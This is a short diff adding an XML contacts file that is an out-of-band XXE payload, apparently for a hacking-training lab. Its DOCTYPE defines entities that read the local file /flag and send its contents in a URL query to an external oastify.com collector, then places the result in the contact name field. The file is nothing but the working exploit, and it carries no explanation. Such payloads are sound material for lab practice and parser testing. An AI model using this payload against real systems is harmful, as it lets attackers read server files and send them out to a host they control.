@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE contacts [
+  <!ENTITY % file SYSTEM "file:///flag">
+  <!ENTITY % eval "<!ENTITY xxe SYSTEM 'http://5hnxmy5gwfnox9u7lgrtli34qvwmkc81.oastify.com/?data=%file;'>">
+  %eval;
+]>
+<contacts>
+  <contact>
+    <name>&xxe;</name>
+    <email>contact@nahamsec.training</email>
+  </contact>
+</contacts>
+
